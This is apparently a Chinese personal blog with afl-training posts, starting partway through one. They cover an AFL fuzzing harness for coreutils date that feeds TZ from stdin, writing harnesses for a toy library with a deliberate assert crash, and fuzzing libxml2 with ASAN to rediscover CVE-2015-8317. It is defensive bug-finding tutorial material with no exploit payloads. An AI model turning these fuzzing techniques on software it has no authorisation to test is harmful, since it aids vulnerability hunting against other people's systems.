<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> val[<span class="number">1024</span> * <span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>, val, <span class="keyword">sizeof</span>(val) - <span class="number">1</span>);</span><br><span class="line">setenv(<span class="string">&quot;TZ&quot;</span>, val, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102403450.png" alt="undifined"></p>
<p>然后重新编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">AFL_USE_ASAN=1 make -j 4</span><br></pre></td></tr></table></figure>

<p>然后重新运行程序，可以看到每次 date 运行前都要从标准输入先获取 TZ 环境变量，修改成功</p>
<p><img src="/images/image-2023-0413-102417721.png" alt="undifined"></p>
<h2 id="开始-fuzz"><a href="#开始-fuzz" class="headerlink" title="开始 fuzz"></a>开始 fuzz</h2><p>设置初始种子，可以就用上面的 Europe&#x2F;London 作为初始种子：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir input </span><br><span class="line">echo &quot;Europe/London&quot; &gt;&gt; ./input/london</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102428963.png" alt="undifined"></p>
<p>fuzz 前需要注意，在教程中使用的是固定日期，并且如果使用 ASAN，需要设置内存限定：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i ./input -o output -- ./src/date --date &quot;2017-03-14 15:00 UTC&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-102443656.png" alt="undifined"></p>
<p>运行了 1 个小时，玩了一会儿游戏，一共挖出 30k 个 crash，但是只有 3 个 unique crashes。</p>
<p>将 crash 传入到 date 运行，ASAN 报错如下：</p>
<p><img src="/images/image-2023-0413-102456866.png" alt="undifined"></p>
<p>的确是发生了溢出</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="http://blog.binpang.me/2018/07/31/afl-asan/">[PCB Blog] AFL Fuzzing with ASAN</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.binpang.me/2018/07/31/afl-asan/">[安全客] AFL-training 学习记录</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20harness/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5Bafl-training%5D%20harness/" class="post-title-link" itemprop="url">[afl-training] harness</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:15:53 / Modified: 10:26:41" itemprop="dateCreated datePublished" datetime="2023-04-13T10:15:53+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-harness"><a href="#afl-training-harness" class="headerlink" title="[afl-training] harness"></a>[afl-training] harness</h1><p>harness 的名词含义是马具，动词含义是给马套上马具，引申为利用，治理。此处的意思或许应该理解为，如何写好一个 harness（马具）来使用 AFL。</p>
<p>之前在做 quickstart 的时候，没有使用 afl-clang-fast 进行编译，而是使用的 afl-clang，刚刚搜到 afl-clang-fast 的话，需要编译 llvm-mode。</p>
<p>此次的章节是讲的如何写 harness 让 AFL 测试代码片段。如果对 AFL 如何将数据发送到目标程序执行比较熟悉的话，可以跳过这一个章节，直接到 challenge 进行实战，如下的图描述了 AFL 的基本流程和模块间的关系。</p>
<ul>
<li>input：input 文件夹存放初始的种子，高质量的种子文件非常重要</li>
<li>queue：从 queue 中读取内容作为程序输入，如果突变后的输入可以触发新的状态变化，将变异后的输入重新放入 queue 中</li>
<li>crash：crash 存放触发 crashes 的输入</li>
</ul>
<p><img src="/images/overview.svg" alt="undifined"></p>
<p>在 library.h 的这个库中，主要的功能是提供输入数据并计算得到输出。假如要测试如下的代码，该如何进行测试？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lib_echo</span><span class="params">(<span class="type">char</span> *data, <span class="type">ssize_t</span> len)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(data) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">1</span>, len);</span><br><span class="line">	<span class="built_in">strncpy</span>(buf, data, len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">	<span class="built_in">free</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// A crash so we can tell the harness is working for lib_echo</span></span><br><span class="line">	<span class="keyword">if</span>(data[<span class="number">0</span>] == <span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(data[<span class="number">1</span>] == <span class="string">&#x27;o&#x27;</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(data[<span class="number">2</span>] ==<span class="string">&#x27;p&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(data[<span class="number">3</span>] == <span class="string">&#x27;!&#x27;</span>) &#123;</span><br><span class="line">					assert(<span class="number">0</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="title function_">lib_mul</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> y &lt;&lt; x;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (y%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> x &lt;&lt; y;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (y == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> x * y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="fuzz-库的单输入函数"><a href="#fuzz-库的单输入函数" class="headerlink" title="fuzz 库的单输入函数"></a>fuzz 库的单输入函数</h2><p>fuzz 需要的准备工作有以下三点：</p>
<ol>
<li>代码是可以正常运行的</li>
<li>需要插桩，来让 AFL 进行高效运行</li>
<li>需要将 fuzzer 生成的数据送入到测试库中，因此，我们必须写一个程序将外部输入送入到测试库中，这可以直接从文件中读取或者从标准输入中读取。</li>
</ol>
<p>为了测试 library.h 库中的函数，那么额外写一个文件 harness.c，其中 main 函数来调用库中的函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *data = <span class="string">&quot;Some input data\n&quot;</span>;</span><br><span class="line">    lib_echo(data, <span class="built_in">strlen</span>(data));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后使用下面的命令进行编译，可以看到一共在 20 个地方进行了插桩：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101641422.png" alt="undifined"></p>
<p>创建 input 文件夹，并在其中提供初始化的种子文件，如果就按照上面编译的方式直接 afl-fuzz，会发现 AFL 提示报错：odd, check syntax!</p>
<p><img src="/images/image-2023-0413-101654342.png" alt="undifined"></p>
<p>在 harness 可执行文件中，调用了 library.h 库中的函数，但是没有设置 hook 使得 AFL 变异产生的数据输入到目标库函数中，因此，运行 afl-fuzz 就会抛出一个警告，没有发生任何的事！因此，我们需要修改 harness 代码，使其从标准输入 STDIN 中获取输入，并且将输入数据喂给目标函数，将 harness.c 修改如下：</p>
<p>新增了 read 函数从标准输入 STDIN 中读取数据到缓冲区 input 中，然后喂给 lib_echo 函数运行，也就是对 lib_echo 函数进行 fuzz：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.</span></span><br><span class="line">    <span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> length;</span><br><span class="line">    length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">    lib_echo(input, length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后重新使用 afl-clang-fast 插桩，再使用 afl-fuzz 运行，现在就可以正常被 fuzz 了，并且产生了 crashes。明确一点，AFL 产生的输入是直接通过标准输入 STDIN 传递。</p>
<p><img src="/images/image-2023-0413-101711061.png" alt="undifined"></p>
<h2 id="fuzz-库的任意输入函数"><a href="#fuzz-库的任意输入函数" class="headerlink" title="fuzz 库的任意输入函数"></a>fuzz 库的任意输入函数</h2><p>如果要测试 lib_mul(int x, int y) 函数，这个函数需要两个输入，而且是两个数字。作者提供的 harness 如下，通过两个 read 函数从 STDIN 标准输入中来传递数据到 harness 可执行文件中。代码修改如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;library.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fixed size buffer based on assumptions about the maximum size that is likely necessary to exercise all aspects of the target function</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;echo&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// make sure buffer is initialized to eliminate variable behaviour that isn&#x27;t dependent on the input.</span></span><br><span class="line">    	<span class="type">char</span> input[SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ssize_t</span> length;</span><br><span class="line">        length = read(STDIN_FILENO, input, SIZE);</span><br><span class="line"></span><br><span class="line">    	lib_echo(input, length);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((argc == <span class="number">2</span>) &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;mul&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> a,b = <span class="number">0</span>;</span><br><span class="line">        read(STDIN_FILENO, &amp;a, <span class="number">4</span>);</span><br><span class="line">        read(STDIN_FILENO, &amp;b, <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lib_mul(a,b));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s mul|echo\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重新使用 afl-clang-fast 编译，使用 afl-fuzz 进行 fuzz，但是这个时候需要带参数 mul 运行 harness，并且还需要在初始输入提供一个高质量：两个回车（或者 &#x2F;0）分隔的整数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">20</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_HARDEN=1 afl-clang-fast harness.c library.c -o harness</span><br><span class="line">afl-fuzz -i in -o out ./harness mul</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101726958.png" alt="undifined"></p>
<p>应该是 fuzz 不出来什么结果了，因为 lib_mul 函数内部是数字运算，触发不了什么异常。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>作者留下了一个练习，如果有一个程序是从 argv 读取文件名，然后读取文件内容到缓冲区，并且将缓冲区传递到目标函数中，那么该如何对这个程序进行 fuzz。</p>
<p>这个部分我没有理解到，是要使用 AFL 构建文件内容然后进行 fuzz 么？</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[[afl-training]%20libxml2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5B%5Bafl-training%5D%20libxml2/" class="post-title-link" itemprop="url">[[afl-training] libxml2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:08:58 / Modified: 10:26:16" itemprop="dateCreated datePublished" datetime="2023-04-13T10:08:58+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-libxml2"><a href="#afl-training-libxml2" class="headerlink" title="[afl-training] libxml2"></a>[afl-training] libxml2</h1><p>libxml2 是一个流行的 XML 库，这类库是非常适合用来做 fuzzing ，理由如下：</p>
<ul>
<li>经常需要解析用户提供的数据</li>
<li>库是由不安全语言编写（例如 C、C++）</li>
<li>无状态</li>
<li>没有网络和文件系统交互</li>
<li>官方提供的 API 就是很好的 fuzz 目标，无需额外去分析和识别库内部的组件关系</li>
<li>运行速度快</li>
</ul>
<p>这次 fuzz 挑战的目标是在库中寻找 CVE-2015-8317，需要使用 AFL 对库源代码进行编译插桩，并且加上 ASAN 选项：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git submodule init &amp;&amp; git submodule update</span><br><span class="line">cd libxml2</span><br><span class="line">CC=afl-clang-fast ./autogen.sh</span><br><span class="line">AFL_USE_ASAN=1 make -j 4</span><br></pre></td></tr></table></figure>

<p>使用 AFL_USE_ASAN&#x3D;1 是开启 ASAN 辅助，这是基于 clang 的一个内存错误检测器，可以检测到常见的内存漏洞，例如栈溢出、堆溢出、double free、uaf 等等。</p>
<h2 id="编写-harness"><a href="#编写-harness" class="headerlink" title="编写 harness"></a>编写 harness</h2><p>在之前的 harness 章节就讲到，fuzz 一个库的基本流程是：</p>
<ol>
<li>对库使用 AFL 进行编译插桩</li>
<li>通过相关的官方文档知道库中的 API 是如何被正常调用的</li>
<li>写一个类似的 harness 调用 API，使得 AFL 产生的输入可以喂给 API 执行，并编译插桩 harness</li>
<li>使用 afl-fuzz 对 harness 进行 fuzz</li>
</ol>
<p>我们已经使用 afl-clang-fast 编译了 libxml2 库，那么接下来就是去官方文档中查看正常情况下正确调用库 API 的案例，libxml2 的官方文档在<a target="_blank" rel="noopener" href="http://xmlsoft.org/examples/index.html">此处</a>，在 fuzz 的时候可以参考此<a target="_blank" rel="noopener" href="http://xmlsoft.org/examples/parse1.c">案例</a>，对库的 xmlReadMemory 函数进行 fuzz。如下是官方提供的 API 调用案例，读取 XML 文件到树上，并释放。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * section: Parsing</span></span><br><span class="line"><span class="comment"> * synopsis: Parse an XML file to a tree and free it</span></span><br><span class="line"><span class="comment"> * purpose: Demonstrate the use of xmlReadFile() to read an XML file</span></span><br><span class="line"><span class="comment"> *          into a tree and xmlFreeDoc() to free the resulting tree</span></span><br><span class="line"><span class="comment"> * usage: parse1 test1.xml</span></span><br><span class="line"><span class="comment"> * test: parse1 test1.xml</span></span><br><span class="line"><span class="comment"> * author: Daniel Veillard</span></span><br><span class="line"><span class="comment"> * copy: see Copyright for the status of this software.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libxml/parser.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libxml/tree.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * example1Func:</span></span><br><span class="line"><span class="comment"> * @filename: a filename or an URL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Parse the resource and free the resulting tree</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">example1Func</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    xmlDocPtr doc; <span class="comment">/* the resulting document tree */</span></span><br><span class="line"></span><br><span class="line">    doc = xmlReadFile(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (doc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to parse %s\n&quot;</span>, filename);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlFreeDoc(doc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this initialize the library and check potential ABI mismatches</span></span><br><span class="line"><span class="comment">     * between the version it was compiled for and the actual shared</span></span><br><span class="line"><span class="comment">     * library used.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    LIBXML_TEST_VERSION</span><br><span class="line"></span><br><span class="line">    <span class="title function_">example1Func</span><span class="params">(argv[<span class="number">1</span>])</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Cleanup function for the XML library.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    xmlCleanupParser();</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is to debug memory for regression tests</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    xmlMemoryDump();</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么我们可以根据上面的案例写出一个 harness，这个在挑战的 ANSWERS.md 中有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/tree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xmlInitParser();</span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">        xmlDocPtr doc = xmlReadFile(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (doc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            xmlFreeDoc(doc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlCleanupParser();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写完 harness.c 后插桩编译，-I 选项是指定包含的头文件目录，然后接上 libxml2 的静态链接库，-lz 是使用 zlib 库，-lm 是使用 math 库，然后编译出来的是一个将 libxml2 静态链接的可执行文件，这样在编译插桩的时候就可以直接对 libxml2 的汇编代码进行插桩（如果之前已经对 libxml2 进行了插桩编译，应该就不需要再静态编译了）。</p>
